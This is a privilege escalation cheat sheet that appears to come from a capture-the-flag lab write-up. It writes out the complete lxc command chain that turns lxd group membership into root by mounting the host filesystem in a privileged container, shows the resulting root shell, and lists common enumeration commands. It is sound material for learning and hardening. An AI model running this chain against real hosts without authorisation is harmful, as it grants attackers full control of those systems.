# Privilege Escalation Cheat Sheet

## Overview

Privilege escalation is the process of moving from a lower-privileged account to a higher-privileged one (typically root) after initial access has been achieved. This lab specifically demonstrated the **LXD group abuse** technique.

## Common Syntax

```bash
<privesc-technique-specific-commands>
```

## Useful Commands

### LXD group abuse (used in this lab)

| Command | Description |
|---|---|
| `id` | Confirm membership in the `lxd` group |
| `lxc image import <file> --alias <name>` | Import a container image |
| `lxc init <image> <container> -c security.privileged=true` | Create a privileged container |
| `lxc config device add <container> <device> disk source=/ path=/mnt/root recursive=true` | Bind-mount the host root filesystem into the container |
| `lxc start <container>` | Start the container |
| `lxc exec <container> /bin/sh` | Get a shell inside the container (root, host-equivalent) |

### General reference (not used in this lab)

| Command | Description |
|---|---|
| `sudo -l` | List sudo permissions for the current user |
| `find / -perm -4000 2>/dev/null` | Locate SUID binaries |
| `find / -writable -type d 2>/dev/null` | Locate world-writable directories |
| `crontab -l` | List scheduled cron jobs for the current user |

## Important Options

| Option | Description |
|---|---|
| `-c security.privileged=true` | Removes container UID/GID mapping, making container root equal to host root |
| `path=/mnt/root` | Mount point inside the container for the bind-mounted host filesystem |
| `recursive=true` | Ensures the entire host filesystem tree under `source=/` is mounted, not just the top level |

## Examples

Used in this lab (full detail in [`docs/07-Privilege-Escalation`](../docs/07-Privilege-Escalation/README.md)):

```bash
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

```text
~ # whoami
root
~ # cat /mnt/root/root/root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

## Common Mistakes

- Forgetting `security.privileged=true`, which would leave UID/GID mapping in place and prevent true root-equivalent access to the mounted host filesystem.
- Not verifying `lxd` group membership first (via `id`) before jumping to more complex privilege escalation techniques.
- Assuming a container image must be built from scratch — pre-built minimal images (like Alpine) transferred via a simple HTTP server are sufficient.

## References

- [LXD Security Documentation](https://documentation.ubuntu.com/lxd/en/latest/explanation/security/)

## Key Takeaways

- `lxd` group membership is functionally equivalent to root access on hosts running LXD; no additional vulnerability is required.
- The full escalation chain in this lab required only five `lxc` commands once a container image was staged on the target.
- Restricting `lxd` group membership to trusted administrators is a standard hardening recommendation, since group membership alone grants this level of access.
